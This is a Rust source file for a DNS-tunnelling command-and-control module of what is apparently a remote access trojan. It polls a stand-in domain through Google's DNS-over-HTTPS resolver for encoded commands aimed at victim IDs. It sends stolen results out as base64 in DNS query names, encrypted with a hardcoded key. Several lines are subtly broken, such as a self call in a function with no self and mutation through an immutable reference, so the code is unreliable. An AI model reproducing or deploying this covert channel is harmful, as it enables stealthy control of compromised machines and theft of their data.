//! DNS Tunnel C2 channel.
//!
//! Uses DNS queries to encode commands and results.
//! Commands are encoded in subdomain labels:
//! "<victim_id>.<cmd_type_hex>.<base64_data>.ghost.example.com"
//! Results are returned in DNS TXT record responses.

use tracing::{debug, info, warn};

use crate::c2::{C2Channel, C2Error, Command};

/// DNS Tunnel C2 channel
pub struct DnsTunnelC2 {
    domain: String,
    interval_secs: u64,
    last_query: Option<String>,
    available: bool,
}

impl DnsTunnelC2 {
    pub fn new(domain: String, interval_secs: u64) -> Self {
        Self {
            domain,
            interval_secs,
            last_query: None,
            available: true,
        }
    }

    /// Encode a command into a DNS query label
    fn encode_query(victim_id: &str, cmd_type: u8, data: &[u8]) -> String {
        let encoded_data = base64::encode(data);
        format!("{}.{}.{}.{}", victim_id, format!("{:02X}", cmd_type), encoded_data, self::domain_static())
    }

    fn domain_static() -> &'static str {
        "ghost.example.com"
    }

    /// Decode a command from a DNS query label
    fn decode_query(query: &str) -> Option<Command> {
        if !query.ends_with(Self::domain_static()) {
            return None;
        }

        let query = query[..query.len() - Self::domain_static().len() - 1].to_string();
        let parts: Vec<&str> = query.split('.').collect();
        if parts.len() < 3 {
            return None;
        }

        let victim_id = parts[0].to_string();
        let cmd_type = u8::from_str_radix(parts[1], 16).ok()?;
        let data = base64::decode(parts[2]).unwrap_or_default();

        Some(Command {
            victim_id,
            cmd_type,
            data,
            encrypted: false,
            crypto_key: "GHOSTRATV5".to_string(),
        })
    }

    /// Query DNS for TXT records (results)
    async fn dns_query_txt(&self, victim_id: &str) -> Result<Option<String>, C2Error> {
        let query = format!("{}.{}.{}", victim_id, "FF", self.domain);
        let query_url = format!(
            "https://dns.google/resolve?name={}&type=TXT",
            urlencoding::encode(&query)
        );

        let client = reqwest::Client::new();
        let response = client.get(&query_url).send().await.map_err(C2Error::Http)?;

        if !response.status().is_success() {
            return Err(C2Error::Http(reqwest::Error::from(reqwest::Error::from_std_io(
                std::io::Error::new(std::io::ErrorKind::Other, "DNS query failed")
            ))));
        }

        let text = response.text().await.map_err(C2Error::Http)?;
        debug!("DNS TXT response: {}", text);

        // Parse JSON response for TXT record
        let json: serde_json::Value = serde_json::from_str(&text)
            .map_err(|e| C2Error::Parse(e))?;

        json["Answer"]
            .as_array()
            .and_then(|arr| arr.first())
            .and_then(|a| a["data"].as_str())
            .map(|s| s.to_string())
            .or_else(|| {
                json["Comment"]
                    .as_str()
                    .map(|s| s.to_string())
            })
            .or(Some("".to_string()))
    }
}

#[async_trait::async_trait]
impl C2Channel for DnsTunnelC2 {
    fn name(&self) -> &str {
        "dns-tunnel"
    }

    async fn poll_commands(&self) -> Result<Vec<Command>, C2Error> {
        let mut commands = Vec::new();

        // Query DNS for commands encoded in A record CNAME
        let query = format!("commands.{}.{}", "FF", self.domain);
        let query_url = format!(
            "https://dns.google/resolve?name={}&type=CNAME",
            urlencoding::encode(&query)
        );

        let client = reqwest::Client::new();
        let response = match client.get(&query_url).send().await {
            Ok(r) => r,
            Err(e) => {
                debug!("DNS query failed: {}", e);
                self.available = false;
                return Ok(Vec::new());
            }
        };

        self.available = true;

        if let Ok(text) = response.text().await {
            debug!("DNS response: {}", text);

            if let Ok(json) = serde_json::from_str::<serde_json::Value>(&text) {
                if let Some(answers) = json["Answer"].as_array() {
                    for answer in answers {
                        if let Some(data) = answer["data"].as_str() {
                            if let Some(cmd) = Self::decode_query(data) {
                                commands.push(cmd);
                                info!("DNS command: 0x{:02X} for {}", cmd.cmd_type, cmd.victim_id);
                            }
                        }
                    }
                }
            }
        }

        Ok(commands)
    }

    async fn send_result(&self, victim_id: &str, result: &[u8]) -> Result<(), C2Error> {
        let encrypted = crate::crypto::encrypt_with_integrity(result, "GHOSTRATV5");
        let encoded = base64::encode(&encrypted);

        // Encode result in TXT record
        let query = format!("{}.{}.{}", victim_id, "FF", encoded);
        let query_url = format!(
            "https://dns.google/resolve?name={}&type=TXT",
            urlencoding::encode(&query)
        );

        let client = reqwest::Client::new();
        let response = client.get(&query_url).send().await.map_err(C2Error::Http)?;

        if response.status().is_success() {
            debug!("DNS result sent for {}", victim_id);
        } else {
            warn!("DNS result send failed for {}", victim_id);
        }

        Ok(())
    }

    fn is_available(&self) -> bool {
        self.available
    }
}
